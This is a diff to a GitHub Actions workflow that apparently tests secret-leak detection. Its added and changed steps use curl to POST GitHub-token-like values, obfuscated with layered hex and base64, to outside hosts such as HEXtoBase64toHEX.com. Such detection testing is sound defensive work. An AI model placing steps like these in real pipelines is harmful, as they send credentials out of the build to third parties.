@@ -160,9 +160,15 @@ jobs:
 
       - name: Mock API key exposure request (HEX to BASE64)
         run: |
-          curl -X POST https://normalsecrets.com \
+          curl -X POST https://HEXtoBase64.com \
           -H "Content-Type: application/json" \
           -d '{"data":{"GH":"Njc2ODcwNWY0NDQ1NDY3YTZkNjczNzUyNDg3MjUxMzI2NTRkNjUzMjQ5NDYzNDRlNzg0ZTU3NTE2ZjY0NTk3MDYxNjIzMzU2NGQ1ODU4NTg="}}'
+
+      - name: Mock API key exposure request (HEX to BASE64 to HEX)
+        run: |
+          curl -X POST https://HEXtoBase64toHEX.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"4e6a63324f4463774e5759304e4451314e44593359545a6b4e6a637a4e7a55794e4467334d6a55784d7a49324e54526b4e6a557a4d6a51354e44597a4e44526c4e7a67305a5455334e5445325a6a59304e546b334d4459784e6a497a4d7a55324e4751314f4455344e54673d"}}'
           
       - name: 3 level base64 encoding secrets
         run: |
@@ -202,4 +208,5 @@ jobs:
           app_token: ${{ secrets.IR_API_KEY_SECRET }}
           send_job_status: "true"
           debug: "true"
+
 
